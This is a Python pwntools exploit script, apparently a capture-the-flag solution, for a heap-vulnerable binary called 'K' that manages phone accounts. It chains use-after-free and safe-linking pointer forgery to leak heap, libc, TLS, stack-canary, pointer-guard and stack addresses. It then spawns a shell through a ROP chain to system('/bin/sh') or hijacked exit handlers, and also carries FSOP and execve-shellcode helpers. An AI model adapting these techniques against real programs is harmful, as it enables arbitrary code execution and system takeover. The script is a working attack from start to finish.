#!/usr/bin/env python3

from pwn import *

exe = ELF('K', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe
context.log_level = 'debug'

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
r = lambda nbytes: p.recv(nbytes)
ru = lambda data: p.recvuntil(data)
rl = lambda : p.recvline()
ra = lambda : p.recvall()

#ret ptr encrypted
def gen(pos, ptr):
    return u64(xor(p64(pos >> 12), p64(ptr)))

#ret heap base
def de(pen, ptr):
    return u64(xor(p64(pen), p64(ptr))) << 12

def leak(sym, recv_val, back_recv_ofs = 0, raw = False, change = False, pos = 0, base = 0):
    ru(recv_val)
    if back_recv_ofs != 0:
        addr = rl()[:-1*(back_recv_ofs+1)]
    else:
        addr = rl()[:-1]
    if raw:
        addr = int(addr, 16)
    else:
        addr = u64(addr.ljust(8, b'\x00'))
    if change:
        if sym == 'Heap':
            addr = addr << 12
        else:
            addr = gen(pos, addr)
    if base != 0:
        addr -= base
    info(f"{sym} address: " + hex(addr))
    return addr

MASK64 = (1 << 64) - 1

def rol64(x, r):
    return ((x << r) | (x >> (64 - r))) & MASK64

def ror64(x, r):
    return ((x >> r) | (x << (64 - r))) & MASK64

def mangle(ptr, key):
    # ptr and key are integers (u64)
    return rol64((ptr ^ key) & MASK64, 17)

def demangle(mangled, key):
    return (ror64(mangled, 17) ^ key) & MASK64

def fsop_to_shell(ofs_gad):
    stdout = libc.sym._IO_2_1_stdout_
    sys = libc.sym.system
    bis = u64(b'/bin/sh\0')
    
    # puts->_IO_wfile_underflow->__libio_codecvt_in
    vta = libc.sym._IO_wfile_jumps - 0x18 # IO_wfile_underflow
    lock = libc.sym._IO_stdfile_1_lock
    gad = libc.address + ofs_gad # add rdi, 0x10; jmp rcx;
    wdata = libc.sym._IO_wide_data_1

    IO = FileStructure()
    IO.flags = 0x3b01010101010101
    IO._IO_read_end = sys
    IO._IO_write_ptr = bis
    IO._IO_buf_end = gad
    IO._old_offset = 0
    IO._lock = lock
    IO._offset = 0
    IO._codecvt = stdout+168
    IO._wide_data = wdata
    IO.unknown2 = p64(stdout+24) + p64(0)*5
    IO.vtable = vta 

    return bytes(IO)

# shell = asm(
#         '''
#         mov rdi, 29400045130965551
#         push rdi
#         mov rdi, rsp
#         mov rax, 0x3b
#         xor rsi, rsi
#         xor rdx, rdx
#         syscall
#         ''',arch='amd64')

def GDB():
    if not args.REMOTE and not args.DOCKER:
        gdb.attach(p, gdbscript='''
        brva 0x1ffd

        c
        ''')
        input()
        # p = gdb.debug([exe.path],"""
        #     b*
        #     c
        #     """)
        # input()
        # return p

LOCAL_HOST = '0.0.0.0'
local_port = 8386
host = ''
port = 0

if args.DOCKER:
    # p = remote(LOCAL_HOST, local_port,ssl=True)
    p = remote(LOCAL_HOST, local_port)
elif args.REMOTE:
    # p = remote(host,port,ssl=True)
    p = remote(host,port)
else:
    p = process([exe.path])

def reg(name, passwd, phone, balance, data, call):
    slna(b'> ', 1)
    sa(b'username:\n> ',name)
    sa(b'password:\n> ',passwd)
    sa(b'phone number:\n> ',phone)
    slna(b'initial balance:\n> ',balance)
    slna(b'initial data (MB):\n> ',data)
    slna(b'initial call minutes:\n> ',call)

def login(name, passwd):
    slna(b'> ', 2)
    sa(b'username:\n> ',name)
    sa(b'password:\n> ',passwd)

def use_services(data, call):
    slna(b'> ', 3)
    slna(b'> ',data)
    slna(b'> ',call)

def edit_info(name, passwd, phone):
    slna(b'> ', 4)
    sa(b'> ',name)
    sa(b'> ',passwd)
    sa(b'> ',phone)

def view_info():
    slna(b'> ', 5)

def view_all():
    slna(b'> ', 6)

def switch_account(name, passwd):
    slna(b'choice:\n> ', 7)
    sa(b'username to switch to:\n> ',name)
    sa(b'password to switch to:\n> ',passwd)

def delete_account():
    slna(b'> ', 8)

def logout():
    slna(b'> ', 9)

def contact_admin(detail, choice):
    slna(b'> ', 10)
    sa(b'you?\n> ', detail)
    slna(b'> ', choice)

def exit():
    slna(b'> ', 11)

reg(b'a', b'a', b'a', 0, 0, 0)
reg(b'b', b'b', b'b', 0, 0, 0)
reg(b'c', b'c', b'c', 0, 0, 0)
reg(b'd', b'd', b'd', 0, 0, 0)
login(b'b', b'b')
delete_account()
login(b'a', b'a')

view_all()
ru(b'Username: ')
ru(b'Username: ')
ru(b'Username: ')
ru(b'Username: ')

heap = u64(rl()[:-1].ljust(8, b'\x00')) << 12
info(f"Heap base: {hex(heap)}")
switch_account(b'c', b'c')
delete_account()
login(b'a', b'a')
contact_admin(b'A'*0x200, 0)
switch_account(p64(gen(heap+0x3a0, heap+0x320)), b'c')
edit_info(p64(gen(heap+0x3a0, heap+0x40)), p64(0), p64(0))

reg(b'e', b'e', b'e', 0, 0, 0)
reg(b'\x00'*14 + b'\x07', b'\x00', b'\x00', 0, 0, 0)

reg(b'a1', b'a1', b'a1', 0, 0, 0)
reg(b'b1', b'b1', b'b1', 0, 0, 0)
reg(b'c1', b'c1', b'c1', 0, 0, 0)
reg(b'd1', b'd1', b'd1', 0, 0, 0)

contact_admin(b'a', 1)

login(b'b1', b'b1')
delete_account()
login(b'c1', b'c1')
delete_account()
login(b'a1', b'a1')

switch_account(p64(gen(heap+0x7b0, heap+0x730)), b'c1')
edit_info(p64(gen(heap+0x7b0, heap+0x460)), p64(0), p64(0))
reg(b'e1', b'e1', b'e1', 0, 0, 0)
reg(b'a'*8, flat(0, heap+0x3a0, heap+0x3a0, 0x211), b'a', 0, 0, 0)

login(b'a'*8, flat(0, heap+0x3a0, heap+0x3a0, 0x211))
view_info()
ru(b'Phone: ')
libc.address = u64(rl()[:-1].ljust(8, b'\x00')) - 0x21ac61
info(f"Libc base: {hex(libc.address)}")
tls = libc.address - 0x28c0

edit_info(b'a'*8, flat(0, tls-0x20), b'\x00')
login(b'\x00', flat(tls, tls+0xa20, tls, 0))
edit_info(flat(0, 0, 0, 0), flat(tls, tls+0xa20, tls, 0), b'a'*9)
view_info()
ru(b'Phone: '+b'a'*9)
canary = u64(b'\x00' + r(7))
info(f"Canary: {hex(canary)}")
key = u64(r(8))
info(f"Key: {hex(key)}")
edit_info(flat(0, 0, 0, 0), flat(tls, tls+0xa20, tls, 0), b'\x00'*8 + p64(canary))

switch_account(b'a'*8, flat(0, tls-0x20, heap+0x3a0, 0x211))
if args.REMOTE or args.DOCKER:
    ofs = 0x46090
else:
    ofs = 0x44090
edit_info(b'a'*8, flat(0, libc.sym.environ + ofs), b'\x00')
login(flat(0, heap, 2, 0), b'\x00')
view_info()
ru(b'Phone: ')
stack = u64(rl()[:-1].ljust(8, b'\x00'))
info(f"Stack address: {hex(stack)}")
ru(b'Balance: ')
exe.address = int(rl()[:-1], 10)
info(f"Exe base: {hex(exe.address)}")

prdi = libc.address + 0x000000000002a3e5
ret = prdi + 1
main_rbp = stack - 0x128

def rop_chain_way():
    info(f"Exe base: {hex(exe.address)}")
    switch_account(b'a'*8, flat(0, libc.sym.environ + ofs, heap+0x3a0, 0x211))
    edit_info(b'a'*8, flat(0, main_rbp-0x20), b'\x00')

    name = flat(main_rbp, exe.address+0x2002, 0x200001000, canary)
    passwd = flat(1, libc.sym.__libc_start_call_main+128, exe.address+0x1fac)
    login(name, passwd)

    rop1 = flat(1, ret, prdi, next(libc.search(b'/bin/sh\x00')))
    rop2 = p64(libc.sym.system)
    edit_info(p64(main_rbp), rop1, rop2)
    exit()

def call_dtors_way():
    exit_func = flat(mangle(libc.sym.system, key), next(libc.search(b'/bin/sh\x00')))
    switch_account(b'a'*8, flat(0, libc.sym.environ + ofs, heap+0x3a0, 0x211))
    edit_info(exit_func, flat(0, tls-0x60), b'\x00')
    name = flat(0, 0, 0, heap+0x10)
    passwd = flat(0, libc.sym.main_arena, 0, 0)
    login(name, passwd)

    edit_info(flat(0, heap+0x460, 0, heap+0x10), p64(0), b'\x00')
    exit()

GDB()
if args.ROPC:
    rop_chain_way()
elif args.DTORS:
    call_dtors_way()
p.interactive()
